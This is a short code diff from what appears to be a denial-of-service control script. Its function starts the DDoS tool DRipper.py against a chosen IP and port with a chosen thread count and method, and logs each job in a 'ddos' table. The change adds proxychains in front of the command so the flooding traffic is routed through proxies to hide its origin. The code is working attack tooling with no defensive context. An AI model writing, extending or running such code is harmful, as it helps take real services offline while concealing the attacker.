@@ -17,7 +17,7 @@ def start(
     ip: str, port: int = 80, threads: int = 100, method: str = 'udp', resource: str = '',
 ):
     p = Popen(
-        ['python3', 'DRipper.py', '-s', ip, '-p', str(port), '-t', str(threads), '-m', method, '--resource', resource],
+        ['proxychains', 'python3', 'DRipper.py', '-s', ip, '-p', str(port), '-t', str(threads), '-m', method, '--resource', resource],
         stdout=PIPE,
     )
     ddos[p.pid] = {'id': p.pid, 'ip': ip, 'port': port, 'url': resource, 'started': datetime.now()}
